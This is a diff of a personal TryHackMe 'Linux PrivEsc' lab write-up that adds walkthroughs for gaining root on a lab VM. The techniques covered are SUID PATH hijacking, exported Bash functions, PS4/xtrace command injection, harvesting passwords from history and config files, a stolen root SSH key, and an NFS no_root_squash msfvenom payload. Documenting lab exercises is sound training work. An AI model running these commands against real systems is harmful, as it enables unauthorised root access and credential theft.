@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/linux-priv-esc/","created":"2026-04-03T22:26:20.103+02:00","updated":"2026-04-05T16:48:59.705+02:00","dg-note-properties":{}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/linux-priv-esc/","created":"2026-04-03T22:26:20.103+02:00","updated":"2026-04-05T18:36:28.214+02:00","dg-note-properties":{}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -503,6 +503,12 @@ Run strings on the file to look for strings of printable characters:
 
 `strings /usr/local/bin/suid-env`
 
+![](/img/user/Attachments/suid-env-strings.png)
+
+**Breakdown**
+It is seen from the output above that there is no absolute path being used for `suid-env` as it simply refers to the executable `service` by its name and not the **absolute path**. This confirms that the `suid-env` is inheriting from PATH. 
+
+**Breakdown from THM**
 One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
 
 Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
@@ -517,18 +523,171 @@ The exploit code shows that `setuid(0)` is setting the necessary root privileges
 Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
 
 `PATH=.:$PATH /usr/local/bin/suid-env`
+This is the SUID binary being executed with the modified PATH.
+
+**Breakdown**
+Whilst being in the directory `/home/user/tools/suid` and appending that working directory (where service.c is located) to PATH the `suid-env` will now execute the malicious code.
 
 
+----------
+
+## SUID / SGID Executables - Abusing Shell Features (#1)
 
 
+The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+
+Verify this with strings:
+
+`strings /usr/local/bin/suid-env2   `
+
+![](/img/user/Attachments/suidenv2absolute.png)
+
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+
+Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+
+`/bin/bash --version`
+
+![](/img/user/Attachments/bash-version.png)
+
+Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+
+`function /usr/sbin/service { /bin/bash -p; }`
+
+`export -f /usr/sbin/service`
+
+Run the suid-env2 executable to gain a root shell:
+
+`/usr/local/bin/suid-env2`  
+
+----------
+
+## SUID / SGID Executables - Abushing Shell Features (#2)
+
+Note: This will not work on Bash versions 4.4 and above.
+
+When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.  
+
+Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+
+`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
+
+Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+
+`/tmp/rootbash -p`
+
+Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
+
+`rm /tmp/rootbash`
 
 
+-------------
+
+## Passwords & Keys - History Files 
+
+If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+
+View the contents of all the hidden history files in the user's home directory:
+
+`cat ~/.*history | less`
+
+Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
+
+Switch to the root user, using the password:
+
+`su root`
+
+`cat ~/.*history | grep -iE "mysql|p|root|username|password"`
+
+Password is unncovered with the above command. 
+
+`mysql -h somehost.local -uroot -ppassword123`
+
+-----
+
+## Passwords & Keys - Config Files
+
+Config files often contain passwords in plaintext or other reversible formats.
+
+List the contents of the user's home directory:
+
+`ls /home/user`
+
+Note the presence of a **myvpn.ovpn** config file. View the contents of the file:
+
+`cat /home/user/myvpn.ovpn`
+
+The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
+
+`su root`  
+
+```
+# creds is stored in this location
+/etc/openvpn/auth.txt
+```
 
 
+---------
 
+## Passwords & Keys - SSH Keys
 
+Sometimes users make backups of important files but fail to secure them with the correct permissions.
 
+Look for hidden files & directories in the system root:
 
+`ls -la /`
+
+Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:
+
+`ls -l /.ssh`
+
+Note that there is a world-readable file called **root_key**. Further inspection of this file should indicate it is a private
+
+key. The name of the file suggests it is for the root user.
+
+Copy the key over to your Kali box (it's easier to just view the contents of the **root_key** file and copy/paste the key) and give it the correct permissions, otherwise your
+
+client will refuse to use it:
+
+`chmod 600 root_key`
+
+Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):
+
+`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.82.153.166`
+
+--------
+
+## NFS
+
+Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+Check the NFS share configuration on the Debian
+
+:
+
+`cat /etc/exports`
+
+Note that the **/tmp** share has root squashing disabled.
+
+On your Kali box, switch to your root user if you are not already running as root:
+
+`sudo su`
+
+Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share (update the IP accordingly):
+
+`mkdir /tmp/nfs   mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`
+
+Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):
+
+`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
+
+Still using Kali's root user, make the file executable and set the SUID permission:
+
+`chmod +xs /tmp/nfs/shell.elf`
+
+Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
+
+`/tmp/shell.elf`
 
 
 
